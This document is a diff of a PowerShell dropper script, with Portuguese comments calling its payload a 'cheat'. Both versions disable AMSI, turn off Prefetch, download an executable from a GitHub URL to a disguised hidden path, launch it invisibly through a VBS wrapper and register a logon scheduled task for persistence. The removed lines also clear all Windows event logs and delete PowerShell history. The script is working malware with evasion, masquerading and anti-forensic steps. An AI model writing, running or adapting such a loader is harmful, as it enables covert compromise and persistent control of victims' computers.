@@ -1,24 +1,31 @@
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -ErrorAction SilentlyContinue
+try {
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -ErrorAction SilentlyContinue
 
-$url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe"
-$path = "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\WinSync.exe"
+    $url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe"
+    $path = "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\WinSync.exe"
 
-(New-Object System.Net.WebClient).DownloadFile($url, $path)
-Set-ItemProperty -Path $path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
+    # Baixa o cheat
+    (New-Object System.Net.WebClient).DownloadFile($url, $path)
+    Set-ItemProperty -Path $path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
 
-$vbsPath = "$env:TEMP\sys_update.vbs"
-"Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"`"`"$path`"`"`", 0, False" | Out-File -FilePath $vbsPath -Encoding ASCII
-Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`""
+    # Cria o VBS para rodar invisível
+    $vbsPath = "$env:TEMP\sys_update.vbs"
+    "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"`"`"$path`"`"`", 0, False" | Out-File -FilePath $vbsPath -Encoding ASCII
+    
+    # Roda
+    Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`""
 
-$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
-$trigger = New-ScheduledTaskTrigger -AtLogOn
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-Register-ScheduledTask -TaskName "WindowsSyncSystem" -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue
+    # Tarefa
+    $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
+    $trigger = New-ScheduledTaskTrigger -AtLogOn
+    Register-ScheduledTask -TaskName "WindowsSyncSystem" -Action $action -Trigger $trigger -Force -ErrorAction SilentlyContinue
 
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 3 -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 3 -ErrorAction SilentlyContinue
 
-Start-Sleep -Seconds 1
-$logs = wevtutil el
-foreach ($log in $logs) { wevtutil cl "$log" 2>$null }
-Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+    # Salva o sucesso
+    "SUCESSO: Comando executado as $(Get-Date)" | Out-File -FilePath "$env:TEMP\erro_cheat.txt" -Append
+} catch {
+    # Se der erro, salva o erro
+    "ERRO: $_" | Out-File -FilePath "$env:TEMP\erro_cheat.txt" -Append
+}
